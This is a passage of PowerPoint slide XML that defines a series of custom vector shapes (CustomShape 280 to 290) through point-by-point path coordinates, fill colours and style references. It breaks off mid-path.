                <a:lnTo>
                  <a:pt x="32" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="49" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="53" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68" y="27"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="664" name="CustomShape 280"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3639960" y="3538440"/>
            <a:ext cx="126360" cy="145440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="80" h="92">
                <a:moveTo>
                  <a:pt x="79" y="4"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="79" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="75" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="51" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="39" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="39" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="51" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="58" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80" y="92"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="4"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="333333"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="665" name="CustomShape 281"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3654360" y="3579840"/>
            <a:ext cx="207360" cy="142200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="131" h="90">
                <a:moveTo>
                  <a:pt x="1" y="68"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="78"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="88" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="91" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="94" y="85"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="102" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="116" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="121" y="60"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="124" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="130" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="131" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="131" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="129" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="127" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="123" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="120" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="116" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="116" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="116" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="108" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="108" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="102" y="68"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="100" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="95" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="92" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="68"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="666" name="CustomShape 282"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3627360" y="3720960"/>
            <a:ext cx="153360" cy="46800"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="97" h="30">
                <a:moveTo>
                  <a:pt x="97" y="10"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="94" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="97" y="10"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="667" name="CustomShape 283"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703680" y="3735360"/>
            <a:ext cx="65880" cy="21600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="42" h="14">
                <a:moveTo>
                  <a:pt x="42" y="6"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="6"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="668" name="CustomShape 284"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3637080" y="3724200"/>
            <a:ext cx="43560" cy="16920"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="28" h="11">
                <a:moveTo>
                  <a:pt x="28" y="5"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="5"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="669" name="CustomShape 285"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3527280" y="3741840"/>
            <a:ext cx="256320" cy="84960"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="162" h="54">
                <a:moveTo>
                  <a:pt x="0" y="16"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="161" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="160" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="159" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="158" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="155" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="153" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="151" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="147" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="145" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="141" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="138" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="136" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="129" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="16"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="670" name="CustomShape 286"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3784680" y="3732120"/>
            <a:ext cx="91440" cy="40680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="58" h="26">
                <a:moveTo>
                  <a:pt x="6" y="26"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="58" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="26"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="001999"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="671" name="CustomShape 287"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3546360" y="3556080"/>
            <a:ext cx="48600" cy="196200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="31" h="124">
                <a:moveTo>
                  <a:pt x="31" y="3"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="31" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="124"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="124"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="124"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="124"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="123"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="123"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="123"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="121"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="121"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="120"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="119"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="118"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="117"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="116"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="112"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="3"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="7fbfbf"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="672" name="CustomShape 288"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3548160" y="3557520"/>
            <a:ext cx="42120" cy="164520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="27" h="104">
                <a:moveTo>
                  <a:pt x="27" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="27" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="102"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="102"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="101"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="99"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="98"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="97"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="96"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="94"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="93cccc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="673" name="CustomShape 289"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3549600" y="3559320"/>
            <a:ext cx="34200" cy="132480"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="22" h="84">
                <a:moveTo>
                  <a:pt x="22" y="3"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="22" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="79"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="3"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="a8d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="674" name="CustomShape 290"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3551400" y="3560760"/>
            <a:ext cx="27720" cy="104040"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="18" h="66">
                <a:moveTo>
                  <a:pt x="18" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="18" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="2"/>
                </a:lnTo>
